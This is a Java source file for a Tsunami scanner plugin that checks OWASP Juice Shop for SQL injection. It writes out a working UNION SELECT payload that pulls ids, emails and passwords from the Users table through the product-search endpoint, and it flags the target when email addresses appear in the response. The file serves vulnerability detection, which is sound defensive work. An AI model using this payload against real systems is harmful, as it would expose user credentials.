/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SqlInjectionDetector",
    version = "0.1",
    description = "Detects sql_injection vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = SqlInjectionDetectorBootstrapModule.class)
public final class SqlInjectionDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  public SqlInjectionDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for SQL Injection Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                // Scan all services for SQL injection, regardless of web service classification
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    try {
      HttpHeaders headers = HttpHeaders.builder()
          .addHeader("Accept", "application/json")
          .addHeader("Content-Type", "application/json")
          .build();

      // Baseline request
      String baseline = "a";
      HttpResponse normalResponse = httpClient.send(
          HttpRequest.get(
              targetUri + "/rest/products/search?q="
                  + URLEncoder.encode(baseline, StandardCharsets.UTF_8))
              .setHeaders(headers)
              .build(),
          networkService);
      // Injection test with UNION payload
      String payload = "a')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--";
      HttpResponse injectedResponse = httpClient.send(
          HttpRequest.get(
              targetUri + "/rest/products/search?q="
                  + URLEncoder.encode(payload, StandardCharsets.UTF_8))
              .setHeaders(headers)
              .build(),
          networkService);

      int normalCode = normalResponse.status().code();
      int injCode = injectedResponse.status().code();
      if (normalCode == 200) {
        if (injCode == 200) {
          // Check for email addresses in JSON response
          String injBody = injectedResponse.bodyBytes()
              .map(bs -> bs.toStringUtf8())
              .orElse("");
          Pattern emailPattern = Pattern.compile("[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}");
          Matcher m = emailPattern.matcher(injBody);
          if (m.find()) {
            return true;
          }
        } else if (injCode >= 500) {
          // Server error likely indicates SQL error injection succeeded
          return true;
        }
      }
      return false;
    } catch (IOException e) {
      logger.atWarning().log(
          format("SQL injection test failed on '%s': %s", networkService, e.getMessage()));
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("sqlInjection"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("SQL Injection detected")
                .setDescription("Detected SQL injection via filter parameter.")
                .setRecommendation(
                    "Use parameterized queries or proper input sanitization."))
        .build();
  }

  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("JUICE_SHOP_SQL_INJECTION"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("JuiceShop SQL Injection Vulnerability")
            .setDescription(
                "The JuiceShop application is vulnerable to SQL injection attacks.")
            .setRecommendation(
                "Implement proper input validation and use parameterized queries.")
            .build());
  }
}